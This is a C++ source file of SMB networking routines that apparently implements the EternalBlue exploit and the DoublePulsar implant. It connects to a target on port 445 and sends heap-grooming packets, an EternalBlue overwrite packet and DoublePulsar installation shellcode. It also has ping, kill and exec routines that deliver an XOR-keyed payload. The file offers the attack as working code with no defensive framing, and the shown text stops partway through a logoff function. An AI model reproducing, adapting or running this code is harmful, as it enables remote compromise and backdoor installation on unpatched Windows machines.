#include "smb.h"

#pragma warning(push)
#pragma warning(disable : 6387)

unsigned int TargetConnect(SOCKET& s, sockaddr_in& sa, WSAData& wsa, const char* targetip, unsigned int& status)
{
	typedef unsigned long(__stdcall* PFN_INET_ADDR)(const char* ip);
	s = NULL;
	sa = { 0 };
	wsa = { 0 };
	status = 0;
	HMODULE wsockdll = NULL;
	PFN_INET_ADDR pinet_addr = NULL;

	status = WSAStartup(MAKEWORD(2, 2), &wsa);
	if (status != 0)
		return MAKEUNSIGNED(WSAGetLastError());

	if (notnull(GetModuleHandleW(TEXT("ws2_32"))))
	{
		wsockdll = GetModuleHandleW(TEXT("ws2_32"));
	}
	else
	{
		wsockdll = LoadLibraryW(TEXT("ws2_32.dll"));
	}

	if (isnull(wsockdll))
		return STATUS_INVALID_HANDLE;
	else
		pinet_addr = (PFN_INET_ADDR)GetProcAddress(wsockdll, "inet_addr");

	if (isnull(pinet_addr))
		ExitProcess(STATUS_INVALID_HANDLE);
	else
		sa.sin_addr.s_addr = pinet_addr(targetip);
	sa.sin_family = AF_INET;
	sa.sin_port = htons(445);

	s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	if (validsock(s))
	{
		status = connect(s, (sockaddr*)&sa, sizeof(sa));
		if (issockerr(status))
		{
#ifdef _DEBUG
			fwprintf_s(stderr, TEXT("[%ws]:\t error 0x%08x occured when calling \"%ws\"\n"), __FUNCTIONW__, STATUS_FAIL, L"connect()");
			(VOID)SleepEx(2000, FALSE);
			ExitProcess(STATUS_FAIL);
#else
			return MAKEUNSIGNED(STATUS_FAIL);
#endif	//_DEBUG
		}
		else
		{
			*(&status) &= 0;
			status = 0;
			return 0;
		}

	}
	else
	{
		return MAKEUNSIGNED(WSAGetLastError());
	}

	return STATUS_FAIL;

}

unsigned int SendData(BUFFER IN OUT* bws, SOCKET& s, unsigned int& status)
{
	status = 0;

	if (badsock(s))
		return MAKEUNSIGNED(WSAGetLastError());

	*(int*)(&status) = send(s, (const char*)bws->pbdata, *(int*)(&bws->dwsize), 0);
	return status;
}

unsigned int RecvData(BUFFER IN OUT* bws, DWORD IN bufsize, SOCKET& s, unsigned int& status)
{
	bwsalloc(bws, bufsize);

	if (badsock(s))
		return MAKEUNSIGNED(WSAGetLastError());

	*(int*)(&status) = recv(s, (char*)bws->pbdata, *(int*)(&bws->dwsize), 0);
	return status;
}

BOOLEAN SendRecvNegotiate(RequestPacketLinkedList OUT* outbound, ResponsePacketLinkedList OUT* inbound, SOCKET& s, smb_info* info)
{
	unsigned int sendstatus = 0, & recievestatus = sendstatus;
	BUFFER* srv = (&outbound->ThisPacket), * client = (&inbound->ThisPacket), tmp = { 0 };

	//attempt to make nego request packet fail if it fails
	if (isnull(negotiate_request_packet(srv, get_pid(info), get_uid(info), get_mid(info), get_tid(info))))
	{
		errmsg(__FUNCSIG__, __LINE__, STATUS_NO_MEMORY);
		return FALSE;
	}

	// exit loop if socket is invalid
	while (validsock(s))
	{
		//send request
		PutUlong(&sendstatus, SendData(srv, s, sendstatus));

		outbound->ThisSmb = MAKEPSMB(srv->pbdata + 4);
		outbound->ThisNetbiosSize = srv->pbdata + sizeof(WORD);

		if (issockerr(sendstatus) || badsock(s) || ((sendstatus & STATUS_FAIL) == STATUS_FAIL))
		{
			sendstatus = STATUS_FAIL;
			break;
		}

		//recv response
		PutUlong(&recievestatus, RecvData(client, 0x200, s, recievestatus));

		bwsalloc(&tmp, recievestatus);
		cpy(tmp.pbdata, inbound->ThisPacket.pbdata, tmp.dwsize);
		bwsfree(&inbound->ThisPacket);
		bwsalloc(&inbound->ThisPacket, tmp.dwsize);
		cpy(inbound->ThisPacket.pbdata, tmp.pbdata, inbound->ThisPacket.dwsize);
		bwsfree(&tmp);

		inbound->ThisSmb = MAKEPSMB(srv->pbdata + 4);
		inbound->ThisNetbiosSize = srv->pbdata + 2;
		outbound->ThisSmb = MAKEPSMB(client->pbdata + SMB_HEADER_OFFSET);
		outbound->ThisNetbiosSize = client->pbdata + NETBIOS_SIZE_OFFSET;

		if (issockerr(recievestatus))
		{
			sendstatus = STATUS_FAIL;
			break;
		}
		else
		{
			return TRUE;
		}
	}

	if (sendstatus == STATUS_FAIL)
	{
		goto cleanup;
	}



cleanup:
	if (validsock(s))
		closesocket(s);
	s = INVALID_SOCKET;
	WSACleanup();
	if (notnull(client->pbdata))
		bwsfree(client);
	if (notnull(srv->pbdata))
		bwsfree(srv);
	return FALSE;
}

BOOLEAN SendRecvSessionSetupAndx(RequestPacketLinkedList OUT* outbound, ResponsePacketLinkedList OUT* inbound, SOCKET& s, smb_info* info)
{
	unsigned int sendstatus[2] = { 0 }, & recievestatus = *sendstatus;
	BUFFER* srv = &outbound->ThisPacket, * client = &inbound->ThisPacket, tmp = { 0 };
	BOOLEAN retval = 0;

	if (isnull(outbound) || isnull(inbound) || isnull(info))
	{
		SetLastError(STATUS_INVALID_PARAMETER);
		//errmsg(__FUNCTION__, __LINE__, GetLastError());
		return FALSE;
	}

	if (badsock(s))
		return FALSE;

	if (isnull(session_setup_packet(srv, get_pid(info), get_uid(info), get_mid(info), get_tid(info))))
	{
		errmsg(__FUNCSIG__, __LINE__, STATUS_NO_MEMORY);
		return FALSE;
	}

	PutUnsigned(sendstatus, SendData(srv, s, GetUnsigned(sendstatus + 1)));

	if (!GetUlong(sendstatus) || issockerr(GetUlong(sendstatus)))
		return FALSE;

	PutUnsigned(&recievestatus, RecvData(client, 0x200, s, GetUnsigned(sendstatus + 1)));

	if (!GetUlong(&recievestatus) || issockerr(GetUlong(&recievestatus)))
		return FALSE;

	bwsalloc(&tmp, GetUlong(&recievestatus));
	cpy(tmp.pbdata, client->pbdata, tmp.dwsize);
	bwsfree(client);

	bwsalloc(client, tmp.dwsize);
	cpy(client->pbdata, tmp.pbdata, client->dwsize);
	bwsfree(&tmp);

	inbound->ThisSmb = MAKEPSMB(client->pbdata + SMB_HEADER_OFFSET);
	outbound->ThisSmb = MAKEPSMB(srv->pbdata + SMB_HEADER_OFFSET);
	inbound->ThisNetbiosSize = MAKEPBYTE(client->pbdata + NETBIOS_SIZE_OFFSET);
	outbound->ThisNetbiosSize = MAKEPBYTE(srv->pbdata + NETBIOS_SIZE_OFFSET);

	return TRUE;
}

BOOLEAN SendRecvTreeConnectAndx(RequestPacketLinkedList OUT* outbound, ResponsePacketLinkedList OUT* inbound, SOCKET& s, smb_info* info, PCWSTR IN ip)
{
	static unsigned int sendsize[2], recvsize[2];
	BUFFER* srv = &outbound->ThisPacket, * client = &inbound->ThisPacket, tmp = { 0 };
	static UNICODE_STRING wstring, unc; static PWSTR unicodeiptmp;
	WCHAR psztmp[0x100] = { 0 };
	static DWORD i;
	BYTE iparray[4] = { 0 };

	unicodeiptmp = MAKEPWSTR(psztmp);

	wsprintfW(unicodeiptmp, L"\\\\%ws\\IPC$", ip);
	InitUnicodeString(unicodeiptmp, &unc);


	if (isnull(tree_connect_packet(srv, &unc, get_pid(info), get_uid(info), get_mid(info), get_tid(info))))
	{
		FreeUnicodeString(&unc);
		return FALSE;
	}



	PutUlong(sendsize, SendData(srv, s, sendsize[1]));

	PutUlong(recvsize, RecvData(client, 0x300, s, recvsize[1]));

	if (!cmp(srv->pbdata + 4, "\xFFSMB", 4))
		return FALSE;
	if (!cmp(client->pbdata + 4, "\xFFSMB", 4))
		return FALSE;

	bwsalloc(&tmp, GetUlong(recvsize));
	cpy(tmp.pbdata, client->pbdata, tmp.dwsize);
	bwsfree(client);
	bwsalloc(client, tmp.dwsize);
	cpy(client->pbdata, tmp.pbdata, client->dwsize);
	bwsfree(&tmp);

	inbound->ThisNetbiosSize = MAKEPBYTE(inbound->ThisPacket.pbdata + sizeof(WORD));
	outbound->ThisNetbiosSize = MAKEPBYTE(outbound->ThisPacket.pbdata + sizeof(WORD));
	inbound->ThisSmb = MAKEPSMB(inbound->ThisPacket.pbdata + 4);
	outbound->ThisSmb = MAKEPSMB(outbound->ThisPacket.pbdata + 4);

	if (inbound->ThisSmb->Status.NtStatus & STATUS_FAIL)
		return FALSE;
	else
		return TRUE;
}

BOOLEAN SendRecvNtTransFirstFea(RequestPacketLinkedList OUT* outbound, ResponsePacketLinkedList OUT* inbound, SOCKET& s, smb_info* info)
{
	static unsigned int sendsize[2], recvsize[2];
	BUFFER* srv = &outbound->ThisPacket, * client = &inbound->ThisPacket, tmp = { 0 };
	packet_creation_handler_type_one create_packet = &nt_trans_first_fea_packet;

	if (isnull(outbound) || isnull(inbound) || isnull(info))
		return FALSE;

	if (badsock(s))
		return FALSE;

	if (isnull(create_packet))
		return FALSE;

	if (isnull(create_packet(srv, get_pid(info), get_uid(info), get_mid(info), get_tid(info))))
		return FALSE;

	PutUnsigned(sendsize, SendData(srv, s, GetUnsigned(sendsize + 1)));

	if (!GetUlong(sendsize) || issockerr(GetUlong(sendsize)))
		return FALSE;

	PutUnsigned(recvsize, RecvData(client, 0x400, s, GetUnsigned(recvsize + 1)));

	if (!GetUlong(recvsize) || issockerr(GetUlong(recvsize)))
		return FALSE;

	bwsalloc(&tmp, GetUlong(recvsize));
	cpy(tmp.pbdata, client->pbdata, tmp.dwsize);
	bwsfree(client);

	bwsalloc(client, tmp.dwsize);
	cpy(client->pbdata, tmp.pbdata, client->dwsize);
	bwsfree(&tmp);

	inbound->ThisNetbiosSize = client->pbdata + NETBIOS_SIZE_OFFSET;
	outbound->ThisNetbiosSize = srv->pbdata + NETBIOS_SIZE_OFFSET;

	inbound->ThisSmb = MAKEPSMB(client->pbdata + SMB_HEADER_OFFSET);
	outbound->ThisSmb = MAKEPSMB(srv->pbdata + SMB_HEADER_OFFSET);

	if (!cmp(inbound->ThisSmb->Protocol, "\xFFSMB", 4))
		return FALSE;
	return TRUE;
}

BOOLEAN SendRecvTrans2SecondaryFidZero(RequestPacketLinkedList OUT* outbound, ResponsePacketLinkedList OUT* inbound, SOCKET& s, smb_info* info)
{
	static unsigned int sendsize[2], recvsize[2];
	BUFFER* srv = &outbound->ThisPacket, * client = &inbound->ThisPacket, tmp = { 0 };
	packet_creation_handler_type_three create_packet = &trans2_secondary_fid_zero_packet;

	if (isnull(outbound) || isnull(inbound) || isnull(info))
		return FALSE;

	if (badsock(s))
		return FALSE;

	if (isnull(create_packet))
		return FALSE;

	if (isnull(create_packet(srv, get_pid(info), get_uid(info), get_mid(info), get_tid(info), get_datadisplacement(info))))
		return FALSE;
	

	PutUnsigned(sendsize, SendData(srv, s, GetUnsigned(sendsize + 1)));

	if (!GetUlong(sendsize) || issockerr(GetUlong(sendsize)))
		return FALSE;
	/*
	PutUnsigned(recvsize, RecvData(client, 0x400, s, GetUnsigned(recvsize + 1)));

	if (!GetUlong(recvsize) || issockerr(GetUlong(recvsize)))
		return FALSE;
	

	bwsalloc(&tmp, GetUlong(recvsize));
	cpy(tmp.pbdata, client->pbdata, tmp.dwsize);
	bwsfree(client);

	bwsalloc(client, tmp.dwsize);
	cpy(client->pbdata, tmp.pbdata, client->dwsize);
	bwsfree(&tmp);
	*/

	//inbound->ThisNetbiosSize = client->pbdata + NETBIOS_SIZE_OFFSET;
	outbound->ThisNetbiosSize = srv->pbdata + NETBIOS_SIZE_OFFSET;
	//inbound->ThisSmb = MAKEPSMB(client->pbdata + SMB_HEADER_OFFSET);
	outbound->ThisSmb = MAKEPSMB(srv->pbdata + SMB_HEADER_OFFSET);

	return TRUE;
}

BOOLEAN SendRecvEcho(RequestPacketLinkedList OUT* outbound, ResponsePacketLinkedList OUT* inbound, SOCKET& s, smb_info* info)
{
	static unsigned int sendsize[2], recvsize[2];
	BUFFER* srv = &outbound->ThisPacket, * client = &inbound->ThisPacket, tmp = { 0 };
	packet_creation_handler_type_one create_packet = &smb_echo_packet;

	if (isnull(outbound) || isnull(inbound) || isnull(info))
		return FALSE;

	if (badsock(s))
		return FALSE;

	if (isnull(create_packet))
		return FALSE;

	if (isnull(create_packet(srv, get_pid(info), get_uid(info), get_mid(info), get_tid(info))))
		return FALSE;

	PutUnsigned(sendsize, SendData(srv, s, GetUnsigned(sendsize + 1)));

	if (!GetUlong(sendsize) || issockerr(GetUlong(sendsize)))
		return FALSE;

	PutUnsigned(recvsize, RecvData(client, 0x400, s, GetUnsigned(recvsize + 1)));

	if (!GetUlong(recvsize) || issockerr(GetUlong(recvsize)))
		return FALSE;

	bwsalloc(&tmp, GetUlong(recvsize));
	cpy(tmp.pbdata, client->pbdata, tmp.dwsize);
	bwsfree(client);

	bwsalloc(client, tmp.dwsize);
	cpy(client->pbdata, tmp.pbdata, client->dwsize);
	bwsfree(&tmp);

	inbound->ThisNetbiosSize = client->pbdata + NETBIOS_SIZE_OFFSET;
	outbound->ThisNetbiosSize = srv->pbdata + NETBIOS_SIZE_OFFSET;

	inbound->ThisSmb = MAKEPSMB(client->pbdata + SMB_HEADER_OFFSET);
	outbound->ThisSmb = MAKEPSMB(srv->pbdata + SMB_HEADER_OFFSET);

	if (!cmp(inbound->ThisSmb->Protocol, "\xFFSMB", 4))
		return FALSE;

	return TRUE;
}

BOOLEAN SendRecvSessionSetupTypeTwo(RequestPacketLinkedList OUT* outbound, ResponsePacketLinkedList OUT* inbound, SOCKET& s, smb_info* info)
{
	static unsigned int sendsize[2], recvsize[2];
	BUFFER* srv = &outbound->ThisPacket, * client = &inbound->ThisPacket, tmp = { 0 };
	packet_creation_handler_type_one create_packet = &session_setup_type_two_packet;

	if (isnull(outbound) || isnull(inbound) || isnull(info))
		return FALSE;

	if (badsock(s))
		return FALSE;

	if (isnull(create_packet))
		return FALSE;

	if (isnull(create_packet(srv, get_pid(info), get_uid(info), get_mid(info), get_tid(info))))
		return FALSE;

	PutUnsigned(sendsize, SendData(srv, s, GetUnsigned(sendsize + 1)));

	if (!GetUlong(sendsize) || issockerr(GetUlong(sendsize)))
		return FALSE;

	PutUnsigned(recvsize, RecvData(client, 0x400, s, GetUnsigned(recvsize + 1)));

	if (!GetUlong(recvsize) || issockerr(GetUlong(recvsize)))
		return FALSE;

	bwsalloc(&tmp, GetUlong(recvsize));
	cpy(tmp.pbdata, client->pbdata, tmp.dwsize);
	bwsfree(client);

	bwsalloc(client, tmp.dwsize);
	cpy(client->pbdata, tmp.pbdata, client->dwsize);
	bwsfree(&tmp);

	inbound->ThisNetbiosSize = client->pbdata + NETBIOS_SIZE_OFFSET;
	outbound->ThisNetbiosSize = srv->pbdata + NETBIOS_SIZE_OFFSET;

	inbound->ThisSmb = MAKEPSMB(client->pbdata + SMB_HEADER_OFFSET);
	outbound->ThisSmb = MAKEPSMB(srv->pbdata + SMB_HEADER_OFFSET);

	if (!cmp(inbound->ThisSmb->Protocol, "\xFFSMB", 4))
		return FALSE;

	return TRUE;
}

BOOLEAN SendRecvGroomFakeSmb2(RequestPacketLinkedList IN OUT* outbound, ResponsePacketLinkedList IN OUT* inbound, SOCKET& s, smb_info IN OUT* info)
{
	static unsigned int sendsize[2], recvsize[2];
	BUFFER* srv = &outbound->ThisPacket, * client = &inbound->ThisPacket, tmp = { 0 };
	packet_creation_handler_type_four create_packet = &fake_smb2_groom_packet;


	if (isnull(outbound) || isnull(inbound) || isnull(info))
		return FALSE;

	if (badsock(s))
		return FALSE;

	if (isnull(create_packet))
		return FALSE;

	if (isnull(create_packet(srv, 0x00)))
		return FALSE;

	PutUnsigned(sendsize, SendData(srv, s, GetUnsigned(sendsize + 1)));

	if (!GetUlong(sendsize) || issockerr(GetUlong(sendsize)))
		return FALSE;

	outbound->ThisSmb = MAKEPSMB(srv->pbdata + SMB_HEADER_OFFSET);
	outbound->ThisNetbiosSize = srv->pbdata + NETBIOS_SIZE_OFFSET;

	inbound->ThisSmb = NULL;
	inbound->ThisNetbiosSize = NULL;

	return TRUE;
}



BOOLEAN SendRecvSessionSetupTypeThree(RequestPacketLinkedList OUT* outbound, ResponsePacketLinkedList OUT* inbound, SOCKET& s, smb_info* info)
{
	static unsigned int sendsize[2], recvsize[2];
	BUFFER* srv = &outbound->ThisPacket, * client = &inbound->ThisPacket, tmp = { 0 };
	packet_creation_handler_type_one create_packet = &session_setup_type_three_packet;

	if (isnull(outbound) || isnull(inbound) || isnull(info))
		return FALSE;

	if (badsock(s))
		return FALSE;

	if (isnull(create_packet))
		return FALSE;

	if (isnull(create_packet(srv, get_pid(info), get_uid(info), get_mid(info), get_tid(info))))
		return FALSE;

	PutUnsigned(sendsize, SendData(srv, s, GetUnsigned(sendsize + 1)));

	if (!GetUlong(sendsize) || issockerr(GetUlong(sendsize)))
		return FALSE;

	PutUnsigned(recvsize, RecvData(client, 0x400, s, GetUnsigned(recvsize + 1)));

	if (!GetUlong(recvsize) || issockerr(GetUlong(recvsize)))
		return FALSE;

	bwsalloc(&tmp, GetUlong(recvsize));
	cpy(tmp.pbdata, client->pbdata, tmp.dwsize);
	bwsfree(client);

	bwsalloc(client, tmp.dwsize);
	cpy(client->pbdata, tmp.pbdata, client->dwsize);
	bwsfree(&tmp);

	inbound->ThisNetbiosSize = client->pbdata + NETBIOS_SIZE_OFFSET;
	outbound->ThisNetbiosSize = srv->pbdata + NETBIOS_SIZE_OFFSET;

	inbound->ThisSmb = MAKEPSMB(client->pbdata + SMB_HEADER_OFFSET);
	outbound->ThisSmb = MAKEPSMB(srv->pbdata + SMB_HEADER_OFFSET);

	if (!cmp(inbound->ThisSmb->Protocol, "\xFFSMB", 4))
		return FALSE;

	return TRUE;
}

BOOLEAN SendRecvTrans2SecondaryFidZeroEternalblueOverwrite(RequestPacketLinkedList OUT* outbound, ResponsePacketLinkedList OUT* inbound, SOCKET& s, smb_info* info)
{
	static unsigned int sendsize[2], recvsize[2];
	BUFFER* srv = &outbound->ThisPacket, * client = &inbound->ThisPacket, tmp = { 0 };
	packet_creation_handler_type_three create_packet = &trans2_secondary_fid_zero_eternalblue_overwrite_packet;

	if (isnull(outbound) || isnull(inbound) || isnull(info))
		return FALSE;

	if (badsock(s))
		return FALSE;

	if (isnull(create_packet))
		return FALSE;

	if (isnull(create_packet(srv, get_pid(info), get_uid(info), get_mid(info), get_tid(info), get_datadisplacement(info))))
		return FALSE;

	PutUnsigned(sendsize, SendData(srv, s, GetUnsigned(sendsize + 1)));

	if (!GetUlong(sendsize) || issockerr(GetUlong(sendsize)))
		return FALSE;

	PutUnsigned(recvsize, RecvData(client, 0x1000, s, GetUnsigned(recvsize + 1)));

	if (!GetUlong(recvsize) || issockerr(GetUlong(recvsize)))
		return FALSE;

	bwsalloc(&tmp, GetUlong(recvsize));
	cpy(tmp.pbdata, client->pbdata, tmp.dwsize);
	bwsfree(client);

	bwsalloc(client, tmp.dwsize);
	cpy(client->pbdata, tmp.pbdata, client->dwsize);
	bwsfree(&tmp);

	outbound->ThisSmb = MAKEPSMB(srv->pbdata + SMB_HEADER_OFFSET);
	outbound->ThisNetbiosSize = srv->pbdata + NETBIOS_SIZE_OFFSET;

	inbound->ThisSmb = MAKEPSMB(client->pbdata + SMB_HEADER_OFFSET);
	inbound->ThisNetbiosSize = client->pbdata + NETBIOS_SIZE_OFFSET;

	if (!cmp(inbound->ThisSmb->Protocol, "\xFFSMB", 4))
		return FALSE;

	return TRUE;
}

BOOLEAN SendRecvDoublePulsarInstallationShellcode(RequestPacketLinkedList OUT* outbound, ResponsePacketLinkedList OUT* inbound, SOCKET& s, smb_info* info)
{
	static unsigned int sendsize[2], recvsize[2];
	BUFFER* srv = &outbound->ThisPacket, * client = &inbound->ThisPacket, tmp = { 0 };
	packet_creation_handler_type_five create_packet = &doublepulsar_installation_shellcode;

	if (isnull(outbound) || isnull(inbound) || isnull(info))
		return FALSE;

	if (badsock(s))
		return FALSE;

	if (isnull(create_packet))
		return FALSE;

	if (isnull(create_packet(srv)))
		return FALSE;

	PutUnsigned(sendsize, SendData(srv, s, GetUnsigned(sendsize + 1)));

	if (!GetUlong(sendsize) || issockerr(GetUlong(sendsize)))
		return FALSE;

	inbound->ThisNetbiosSize = NULL, inbound->ThisSmb = NULL;
	outbound->ThisNetbiosSize = NULL, outbound->ThisSmb = NULL;

	return TRUE;
}




/*
 *
 *
 *
 *	Double Pulsar networking functions
 *
 *
 *
 */

BOOLEAN SendRecvTrans2SessionSetup(RequestPacketLinkedList* IN OUT outbound, ResponsePacketLinkedList* IN OUT inbound, SOCKET& IN s, smb_info* IN info)
{
	static unsigned int sendsize[2], recvsize[2];
	BUFFER* srv = &outbound->ThisPacket, * client = &inbound->ThisPacket, tmp = { 0 };
	packet_creation_handler_type_one create_packet = &trans2_session_setup_packet;

	if (isnull(outbound) || isnull(inbound) || isnull(info))
		return FALSE;

	if (badsock(s))
		return FALSE;

	if (isnull(create_packet))
		return FALSE;

	if (isnull(create_packet(srv, get_pid(info), get_uid(info), get_mid(info), get_tid(info))))
		return FALSE;

	PutUnsigned(sendsize, SendData(srv, s, GetUnsigned(sendsize + 1)));

	if (!GetUlong(sendsize) || issockerr(GetUlong(sendsize)))
		return FALSE;

	PutUnsigned(recvsize, RecvData(client, 0x400, s, GetUnsigned(recvsize + 1)));

	if (!GetUlong(recvsize) || issockerr(GetUlong(recvsize)))
		return FALSE;

	bwsalloc(&tmp, GetUlong(recvsize));
	cpy(tmp.pbdata, client->pbdata, tmp.dwsize);
	bwsfree(client);

	bwsalloc(client, tmp.dwsize);
	cpy(client->pbdata, tmp.pbdata, client->dwsize);
	bwsfree(&tmp);

	inbound->ThisNetbiosSize = client->pbdata + NETBIOS_SIZE_OFFSET;
	outbound->ThisNetbiosSize = srv->pbdata + NETBIOS_SIZE_OFFSET;

	inbound->ThisSmb = MAKEPSMB(client->pbdata + SMB_HEADER_OFFSET);
	outbound->ThisSmb = MAKEPSMB(srv->pbdata + SMB_HEADER_OFFSET);

	if (!cmp(inbound->ThisSmb->Protocol, "\xFFSMB", 4))
		return FALSE;

	return TRUE;
}

BOOLEAN SendRecvTrans2SessionSetupPing(RequestPacketLinkedList* IN OUT outbound, ResponsePacketLinkedList* IN OUT inbound, SOCKET& IN s, smb_info* IN info)
{
	static unsigned int sendsize[2], recvsize[2];
	BUFFER* srv = &outbound->ThisPacket, * client = &inbound->ThisPacket, tmp = { 0 };
	packet_creation_handler_type_one create_packet = &trans2_session_setup_dopu_ping;

	if (isnull(outbound) || isnull(inbound) || isnull(info))
		return FALSE;

	if (badsock(s))
		return FALSE;

	if (isnull(create_packet))
		return FALSE;

	if (isnull(create_packet(srv, get_pid(info), get_uid(info), get_mid(info), get_tid(info))))
		return FALSE;

	PutUnsigned(sendsize, SendData(srv, s, GetUnsigned(sendsize + 1)));

	if (!GetUlong(sendsize) || issockerr(GetUlong(sendsize)))
		return FALSE;

	PutUnsigned(recvsize, RecvData(client, 0x400, s, GetUnsigned(recvsize + 1)));

	if (!GetUlong(recvsize) || issockerr(GetUlong(recvsize)))
		return FALSE;

	bwsalloc(&tmp, GetUlong(recvsize));
	cpy(tmp.pbdata, client->pbdata, tmp.dwsize);
	bwsfree(client);

	bwsalloc(client, tmp.dwsize);
	cpy(client->pbdata, tmp.pbdata, client->dwsize);
	bwsfree(&tmp);

	inbound->ThisNetbiosSize = client->pbdata + NETBIOS_SIZE_OFFSET;
	outbound->ThisNetbiosSize = srv->pbdata + NETBIOS_SIZE_OFFSET;

	inbound->ThisSmb = MAKEPSMB(client->pbdata + SMB_HEADER_OFFSET);
	outbound->ThisSmb = MAKEPSMB(srv->pbdata + SMB_HEADER_OFFSET);

	if (!cmp(inbound->ThisSmb->Protocol, "\xFFSMB", 4))
		return FALSE;

	return TRUE;
}

BOOLEAN SendRecvTrans2SessionSetupKill(RequestPacketLinkedList* IN OUT outbound, ResponsePacketLinkedList* IN OUT inbound, SOCKET& IN s, smb_info* IN info)
{
	static unsigned int sendsize[2], recvsize[2];
	BUFFER* srv = &outbound->ThisPacket, * client = &inbound->ThisPacket, tmp = { 0 };
	packet_creation_handler_type_one create_packet = &trans2_session_setup_dopu_kill;

	if (isnull(outbound) || isnull(inbound) || isnull(info))
		return FALSE;

	if (badsock(s))
		return FALSE;

	if (isnull(create_packet))
		return FALSE;

	if (isnull(create_packet(srv, get_pid(info), get_uid(info), get_mid(info), get_tid(info))))
		return FALSE;

	PutUnsigned(sendsize, SendData(srv, s, GetUnsigned(sendsize + 1)));

	if (!GetUlong(sendsize) || issockerr(GetUlong(sendsize)))
		return FALSE;

	PutUnsigned(recvsize, RecvData(client, 0x400, s, GetUnsigned(recvsize + 1)));

	if (!GetUlong(recvsize) || issockerr(GetUlong(recvsize)))
		return FALSE;

	bwsalloc(&tmp, GetUlong(recvsize));
	cpy(tmp.pbdata, client->pbdata, tmp.dwsize);
	bwsfree(client);

	bwsalloc(client, tmp.dwsize);
	cpy(client->pbdata, tmp.pbdata, client->dwsize);
	bwsfree(&tmp);

	inbound->ThisNetbiosSize = client->pbdata + NETBIOS_SIZE_OFFSET;
	outbound->ThisNetbiosSize = srv->pbdata + NETBIOS_SIZE_OFFSET;

	inbound->ThisSmb = MAKEPSMB(client->pbdata + SMB_HEADER_OFFSET);
	outbound->ThisSmb = MAKEPSMB(srv->pbdata + SMB_HEADER_OFFSET);

	if (!cmp(inbound->ThisSmb->Protocol, "\xFFSMB", 4))
		return FALSE;

	return TRUE;
}

BOOLEAN SendRecvTrans2SessionSetupExec(RequestPacketLinkedList* IN OUT outbound, ResponsePacketLinkedList* IN OUT inbound, SOCKET& IN s, smb_info* IN info, BUFFER IN* xorkeypacket, BUFFER IN* payload)
{
	static unsigned int sendsize[2], recvsize[2];
	BUFFER* srv = &outbound->ThisPacket, * client = &inbound->ThisPacket, tmp = { 0 };
	packet_creation_handler_type_six create_packet = &trans2_session_setup_dopu_exec;

	if (isnull(outbound) || isnull(inbound) || isnull(info) || isnull(xorkeypacket) || isnull(payload))
	{
		SetLastError(STATUS_INVALID_PARAMETER);
		return FALSE;
	}

	if (badsock(s))
	{
		SetLastError(((WSAGetLastError() != 0) ? WSAGetLastError() : STATUS_INVALID_PARAMETER));
		return FALSE;
	}

	if (isnull(create_packet))
	{
		SetLastError(STATUS_INVALID_PARAMETER);
		return FALSE;
	}

	if (isnull(create_packet(srv, xorkeypacket, payload, get_pid(info), get_uid(info), get_mid(info), get_tid(info))))
	{
		if (!GetLastError())
			SetLastError(STATUS_FAIL);
		return FALSE;
	}

	PutUnsigned(sendsize, SendData(srv, s, GetUnsigned(sendsize + 1)));

	if (!GetUlong(sendsize) || issockerr(GetUlong(sendsize)))
		return FALSE;

	/*PutUnsigned(recvsize, RecvData(client, 0x1000, s, GetUnsigned(recvsize + 1)));

	if (!GetUlong(recvsize) || issockerr(GetUlong(recvsize)))
		return FALSE;

	bwsalloc(&tmp, GetUlong(recvsize));
	cpy(tmp.pbdata, client->pbdata, tmp.dwsize);
	bwsfree(client);

	bwsalloc(client, tmp.dwsize);
	cpy(client->pbdata, tmp.pbdata, client->dwsize);
	bwsfree(&tmp);

	inbound->ThisNetbiosSize = client->pbdata + NETBIOS_SIZE_OFFSET;
	outbound->ThisNetbiosSize = srv->pbdata + NETBIOS_SIZE_OFFSET;

	inbound->ThisSmb = MAKEPSMB(client->pbdata + SMB_HEADER_OFFSET);
	outbound->ThisSmb = MAKEPSMB(srv->pbdata + SMB_HEADER_OFFSET);

	if (!cmp(inbound->ThisSmb->Protocol, "\xFFSMB", 4))
		return FALSE;*/
	return TRUE;
}

BOOLEAN SendRecvTreeDisconnect(RequestPacketLinkedList* IN OUT outbound, ResponsePacketLinkedList* IN OUT inbound, SOCKET& IN s, smb_info* IN info)
{
	static unsigned int sendsize[2], recvsize[2];
	BUFFER* srv = &outbound->ThisPacket, * client = &inbound->ThisPacket, tmp = { 0 };
	packet_creation_handler_type_one create_packet = &tree_disconnect_packet;

	if (isnull(outbound) || isnull(inbound) || isnull(info))
		return FALSE;

	if (badsock(s))
		return FALSE;

	if (isnull(create_packet))
		return FALSE;

	if (isnull(create_packet(srv, get_pid(info), get_uid(info), get_mid(info), get_tid(info))))
		return FALSE;

	PutUnsigned(sendsize, SendData(srv, s, GetUnsigned(sendsize + 1)));

	if (!GetUlong(sendsize) || issockerr(GetUlong(sendsize)))
		return FALSE;

	PutUnsigned(recvsize, RecvData(client, 0x400, s, GetUnsigned(recvsize + 1)));

	if (!GetUlong(recvsize) || issockerr(GetUlong(recvsize)))
		return FALSE;

	bwsalloc(&tmp, GetUlong(recvsize));
	cpy(tmp.pbdata, client->pbdata, tmp.dwsize);
	bwsfree(client);

	bwsalloc(client, tmp.dwsize);
	cpy(client->pbdata, tmp.pbdata, client->dwsize);
	bwsfree(&tmp);

	inbound->ThisNetbiosSize = client->pbdata + NETBIOS_SIZE_OFFSET;
	outbound->ThisNetbiosSize = srv->pbdata + NETBIOS_SIZE_OFFSET;

	inbound->ThisSmb = MAKEPSMB(client->pbdata + SMB_HEADER_OFFSET);
	outbound->ThisSmb = MAKEPSMB(srv->pbdata + SMB_HEADER_OFFSET);

	if (!cmp(inbound->ThisSmb->Protocol, "\xFFSMB", 4))
		return FALSE;

	return TRUE;
}

BOOLEAN SendRecvLogoffAndx(RequestPacketLinkedList* IN OUT outbound, ResponsePacketLinkedList* IN OUT inbound, SOCKET& IN s, smb_info* IN info)
{
	static unsigned int sendsize[2], recvsize[2];
	BUFFER* srv = &outbound->ThisPacket, * client = &inbound->ThisPacket, tmp = { 0 };
	packet_creation_handler_type_one create_packet = &logoff_andx_packet;

	if (isnull(outbound) || isnull(inbound) || isnull(info))
		return FALSE;

	if (badsock(s))
		return FALSE;

	if (isnull(create_packet))
		return FALSE;

	if (isnull(create_packet(srv, get_pid(info), get_uid(info), get_mid(info), get_tid(info))))
		return FALSE;

	PutUnsigned(sendsize, SendData(srv, s, GetUnsigned(sendsize + 1)));

	if (!GetUlong(sendsize) || issockerr(GetUlong(sendsize)))
		return FALSE;

